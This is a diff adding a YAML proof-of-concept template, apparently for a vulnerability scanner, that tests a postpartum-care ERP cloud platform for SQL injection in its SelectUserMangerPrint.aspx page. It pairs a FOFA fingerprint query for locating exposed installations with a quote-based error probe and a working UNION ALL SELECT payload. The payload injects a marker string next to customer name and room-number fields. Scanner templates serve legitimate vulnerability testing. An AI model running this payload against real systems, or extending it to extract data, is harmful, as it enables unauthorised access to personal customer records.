@@ -1,0 +1,31 @@
+id: poc-yaml-jintongfang-erp-selectusermangerprint-sqli
+info:
+  name: 月子会所ERP管理云平台 SelectUserMangerPrint SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 月子会所ERP管理云平台
+  fofa: app="妈妈宝盒-ERP"
+requests:
+- method: GET
+  path: /Page/SalerManager/SelectUserMangerPrint.aspx?id=1'
+  expression: 'status_code == 500 &&
+
+    contains(body,"SqlException") &&
+
+    contains(body,"SQL Server ")
+
+    '
+- method: GET
+  path: /Page/SalerManager/SelectUserMangerPrint.aspx?id=1%29+UNION+ALL+SELECT+NULL%2CNULL%2CCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%2882%29%2BCHAR%28113%29%2BCHAR%2870%29%2BCHAR%28108%29%2BCHAR%2883%29%2BCHAR%28111%29%2CNULL--+EfIE
+  expression: 'status_code == 200 &&
+
+    contains(body,"姓名") &&
+
+    contains(body,"房号") &&
+
+    contains(body,"qqxbqRqFlSo")
+
+    '
+variables: {}
+transport: http
